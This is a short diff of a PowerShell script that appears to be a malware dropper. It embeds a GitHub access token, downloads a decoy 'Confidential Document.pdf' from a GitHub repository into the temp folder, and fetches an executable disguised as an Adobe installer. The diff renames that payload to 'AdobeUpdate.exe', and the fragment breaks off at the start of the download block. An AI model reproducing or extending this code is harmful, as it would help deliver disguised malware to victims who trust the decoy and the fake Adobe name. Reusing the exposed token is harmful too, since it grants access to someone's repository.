@@ -36,8 +36,8 @@ $state | Out-File (Join-Path $env:TEMP 'value.txt')
 $GhToken = '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'
 $DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
 $DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
-$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/AdobeCreativeCloudInstaller.exe'
-$wrapperPath = Join-Path $env:TEMP 'AdobeCreativeCloudInstaller.exe'
+$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/AdobeUpdate.exe'
+$wrapperPath = Join-Path $env:TEMP 'AdobeUpdate.exe'
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
